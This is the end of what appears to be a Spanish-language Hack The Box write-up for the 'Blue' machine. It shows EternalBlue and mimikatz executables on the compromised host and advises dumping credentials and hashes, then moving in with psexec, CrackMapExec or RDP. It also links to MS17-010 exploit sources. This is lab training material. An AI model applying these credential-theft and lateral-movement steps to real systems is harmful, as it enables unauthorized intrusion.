+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is BE92-053B
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>12/03/2024  05:15            73,802 eternal-blue.exe
+</span></span><span style="display:flex;"><span>12/03/2024  06:04         1,355,264 mimikatz.exe
+</span></span><span style="display:flex;"><span>14/07/2009  03:20    &lt;DIR&gt;          PerfLogs
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y listo, ahora podemos usar la herramienta <strong>mimikatz.exe</strong> para obtener los hashes y credenciales.</p>
+<p>Ahora que tienes las credenciales y hashes, puedes probar a conectarte a la máquina con la herramienta <strong>psexec</strong> o con <strong>Crackmapexec</strong> alzar el <strong>servicio RDP</strong> y conectarte, etc. ¡Intentalo!.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank" rel="noopener noreferrer">https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit</a></li><li><a href="https://www.avast.com/es-es/c-eternalblue" target="_blank" rel="noopener noreferrer">https://www.avast.com/es-es/c-eternalblue</a></li><li><a href="https://www.exploit-db.com/exploits/42315" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/42315</a></li><li><a href="https://github.com/worawit/MS17-010" target="_blank" rel="noopener noreferrer">https://github.com/worawit/MS17-010</a></li><li><a href="https://www.elladodelmal.com/2018/01/named-pipe-impersonation-escalando.html" target="_blank" rel="noopener noreferrer">https://www.elladodelmal.com/2018/01/named-pipe-impersonation-escalando.html</a></li><li><a href="https://resources.infosecinstitute.com/topics/penetration-testing/mimikatz-walkthrough/" target="_blank" rel="noopener noreferrer">https://resources.infosecinstitute.com/topics/penetration-testing/mimikatz-walkthrough/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-netmon/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Netmon - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-bountyhunter/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Bounty Hunter - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
